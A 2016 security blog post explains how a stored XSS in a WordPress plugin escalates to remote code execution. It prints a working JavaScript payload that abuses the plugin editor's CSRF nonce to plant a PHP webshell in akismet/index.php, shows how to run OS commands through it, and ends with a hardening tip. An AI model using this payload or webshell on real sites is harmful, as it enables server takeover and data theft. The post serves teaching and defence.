---
title: "XSS to RCE – using WordPress as an example"
date: 2016-07-17
categories:
- xss
- rce
- wordpress
- poc
tags:
- webshell
- wordpress
- poc

thumbnailImagePosition: left
thumbnailImage: /img/xss-to-rce-using-wordpress-as-an-example/1.png
---

A real world example of how an XSS in the administration portal of a WordPress instance can lead to an RCE by uploading a webshell using the XSS.

<!--more-->

## Introduction

Cross Site Scripting (XSS) is a type of client side vulnerability that arises when an application accepts user supplied input and makes it a part of the page without sanitizing it for malicious content. An attacker can supply JavaScript as input that eventually becomes a part of the page and executes in the browser of the user viewing the page. You can read more about the different types of [XSS vulnerabilities at the OWASP wiki](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)).

Most vulnerability assessments report XSS issues with the impact limited to stealing session cookies and hijacking accounts. In reality, a well executed XSS attack can cause a lot more harm than merely overtaking an account. Of course it depends on what other vulnerabilities are present in the application in the post login pages. Also, depending on the privileges of the user whose session was hijacked, added functionality may be available ready for abuse.

## Other interesting cases

There have been several well documented cases of a XSS leading to larger more impactful attacks. Here are some examples

1. XSS worm by Samy: - https://samy.pl/popular/tech.html
2. Apache network compromise starting with a XSS in Atlassian JIRA: - https://blogs.apache.org/infra/entry/apache_org_04_09_2010
3. XSS to RCE in Node via process.open() - https://oreoshake.github.io/xss/rce/bugbounty/2015/09/08/xss-to-rce.html

## The attack steps

In a standard XSS attack, a penetration tester would usually take the following steps

1. Find a XSS vulnerability
2. Host a collecting server to capture session cookies that will be delivered by your XSS payload
3. Send the URL with the XSS payload to a user via email (Reflected XSS) OR Store the XSS payload and wait for a user (or social engineer them to visit if you lack patience) to visit the vulnerable page
4. Replay the session cookies to the application and gain access to the victim’s account.
5. Explore the application for data/other vulnerabilities.

In the event that an application has functionality that allows a user to upload executable code (php pages for example) or edit existing server side code, then you can choose to attack that functionality directly with a XSS payload. [Akash Mahajan](https://twitter.com/makash), my friend and partner at [Appsecco](https://appsecco.com/), pointed out a tweet by [@brutelogic](https://twitter.com/brutelogic/status/752111662254227456) which, in my opinion, is a fantastic JavaScript XSS payload to use the plugin-editor of WordPress to update an existing PHP page with shellcode. 

So I setup a local WP with a [plugin that was vulnerable to XSS](https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html) and used the following JS payload as mentioned in the tweet.

```javascript
x=new XMLHttpRequest()
p='/wp-admin/plugin-editor.php?'
f='file=akismet/index.php'
x.open('GET',p+f,0)
x.send()
$='_wpnonce='+/ce" value="([^"]*?)"/.exec(x.responseText)[1]+'&newcontent=<?=`$_GET[brute]`;&action=update&'+f
x.open('POST',p+f,1)
x.setRequestHeader('Content-Type','application/x-www-form-urlencoded')
x.send($)
```

Here’s what the payload does

1. Creates a new `XMLHttpRequest()` object `x`
2. `p` and `f` hold the complete URL to load
3The file that will be updated is `akismet/index.php`
4. `x.open('GET',p+f,0)` and `x.send()` are used to specify the type of request and to send the actual request respectively
5. The `$` contains the POST data that will be sent
6. For every POST request in WordPress you need the `_wpnonce` token. The `/ce" value="([^"]*?)"/.exec(x.responseText)[1]` extracts the csrf token from the previous response using a regular expression
7. The php shell code is ``<?=`$_GET[brute]`;``
8. A new POST request is created and sent to the server along with appropriate form submit headers.

If an admin navigates to `/wp-admin/plugin-editor.php?file=akismet/index.php`, this is what they will see

![](/img/xss-to-rce-using-wordpress-as-an-example/1.png)

To access the shell, navigate to `/wp-content/plugins/akismet/index.php?brute=ls -a`. You can now interact and execute operating system commands with the WordPress server using the brute parameter. To make the output more readable simply use the view-source option of the page.

![](/img/xss-to-rce-using-wordpress-as-an-example/2.png)

This attack will obviously not work if the plugin editor is disabled which can be done by placing `define('DISALLOW_FILE_EDIT', true);` in the `wp-config.php` file. You can read more WordPress hardening tips at https://codex.wordpress.org/Hardening_WordPress (shouts to [@anantshri](https://twitter.com/anantshri)).

Happy Hacking!

---